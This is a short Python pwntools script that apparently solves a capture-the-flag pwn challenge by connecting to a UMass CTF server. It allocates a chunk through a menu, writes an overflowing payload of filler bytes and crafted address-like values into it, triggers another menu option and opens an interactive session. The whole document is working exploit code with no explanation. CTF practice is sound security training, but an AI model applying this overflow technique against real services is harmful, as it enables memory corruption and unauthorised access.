#!/usr/bin/env python3
from pwn import *
connection_string = " nc mitigations-are-awesome.ctf.umasscybersec.org 1337 ".strip().split(" ")

def conn():
    return remote(connection_string[1], int(connection_string[2]))

def main():
    r = conn()

    payload = b'A'*32 + b'\00'*8 + b'\x61\x08\x02' + b'\00'*5 + b'\x45\x7a\x20\x57' + b'\00'*4

    r.sendline(b'1') # mode
    r.sendline(b'32') 

    r.sendline(b'3') # mode
    r.sendline(b'0') # index
    r.sendline(str(len(payload)).encode()) # size to read
    r.sendline(payload) # payload

    
    r.sendline(b'4') 
    r.interactive()

if __name__ == "__main__":
    main()
